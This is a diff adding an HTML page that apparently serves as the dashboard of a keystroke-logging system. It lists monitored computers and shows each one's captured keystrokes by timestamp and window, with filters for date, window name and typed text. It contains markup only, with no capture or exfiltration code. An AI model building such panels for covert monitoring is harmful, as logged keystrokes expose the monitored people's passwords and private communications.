@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Search Computers</title>
+    <link rel="stylesheet" href="../static/styles/style.css">
+</head>
+<body>
+    <h1>Search for a Computer</h1>
+    <button id="refreshButton">Refresh Data</button>
+    <table id="computersTable">
+        <thead>
+            <tr>
+                <th>Computer Name</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- Data will be populated here by JavaScript -->
+        </tbody>
+    </table>
+    <div id="keystrokesSection" style="display: none;">
+        <h2>Keystrokes for <span id="computerName"></span></h2>
+        <form id="filterForm">
+            <label for="filterDate">Choose a date:</label>
+            <input type="date" id="filterDate" name="date">
+            <label for="filterWindow">Window:</label>
+            <input type="text" id="filterWindow" name="window" placeholder="Enter window name">
+            <label for="filterText">Search text:</label>
+            <input type="text" id="filterText" name="searchText" placeholder="Enter text to search">
+            <button type="submit">Filter</button>
+        </form>
+        <table id="keystrokesTable">
+            <thead>
+                <tr>
+                    <th>Timestamp</th>
+                    <th>Window</th>
+                    <th>Keystrokes</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- Data will be populated here by JavaScript -->
+            </tbody>
+        </table>
+    </div>
+    <script src="../static/scripts/script.js"></script>
+</body>
+</html>
